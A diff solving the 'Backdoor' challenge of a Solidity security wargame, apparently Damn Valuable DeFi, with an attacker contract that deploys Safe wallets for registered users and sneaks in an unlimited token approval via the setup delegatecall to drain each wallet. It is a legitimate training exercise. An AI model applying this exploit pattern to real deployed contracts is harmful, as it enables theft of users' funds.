@@ -70,7 +70,7 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new BackdoorAttacker(walletFactory, singletonCopy, walletRegistry, token, recovery, users);
     }
 
     /**
@@ -92,5 +92,43 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract BackdoorAttacker {
+    constructor(
+        SafeProxyFactory walletFactory,
+        Safe singletonCopy,
+        WalletRegistry walletRegistry,
+        DamnValuableToken token,
+        address recovery,
+        address[] memory users
+    ) {
+        BackdoorApprovalHelper helper = new BackdoorApprovalHelper();
+        bytes memory approvalData = abi.encodeCall(helper.approveToken, (address(token), address(this)));
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (owners, 1, address(helper), approvalData, address(0), address(0), 0, payable(address(0)))
+            );
+
+            address wallet = address(
+                walletFactory.createProxyWithCallback(
+                    address(singletonCopy), initializer, i, walletRegistry
+                )
+            );
+
+            token.transferFrom(wallet, recovery, 10 ether);
+        }
+    }
+}
+
+contract BackdoorApprovalHelper {
+    function approveToken(address token, address spender) external {
+        DamnValuableToken(token).approve(spender, type(uint256).max);
     }
 }
